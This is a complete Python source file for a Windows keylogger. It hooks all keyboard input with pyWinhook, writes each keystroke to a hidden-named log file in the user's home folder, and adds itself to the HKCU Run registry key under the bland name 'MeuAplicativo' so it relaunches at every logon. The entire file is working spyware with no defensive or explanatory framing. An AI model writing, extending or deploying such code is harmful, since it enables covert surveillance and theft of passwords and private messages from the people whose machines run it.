import os
import pythoncom
import pyWinhook as pyHook
import winreg as reg

log_file_path = os.path.join(os.path.expanduser("~"), "kl.txt")

def add_to_startup(file_path, app_name):
    try:
        
        reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_key, 0, reg.KEY_SET_VALUE)
        
        
        reg.SetValueEx(key, app_name, 0, reg.REG_SZ, file_path)
        
        
        reg.CloseKey(key)
        
        print(f"'{app_name}' added to windows.")
    except Exception as e:
        print(f"Error to add app to windows: {e}")

def on_keyboard_event(event):
    try:
        with open(log_file_path, "a") as f:
            f.write(f'Key: {event.Key} - KeyID: {event.KeyID}\n')
    except Exception as e:
        print(f"Error to write in the file: {e}")
    return True 

def main():
    file_path = os.path.abspath(__file__)
    app_name = "MeuAplicativo"
    add_to_startup(file_path, app_name)

    hm = pyHook.HookManager()
    hm.KeyDown = on_keyboard_event
    hm.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == "__main__":
    main()
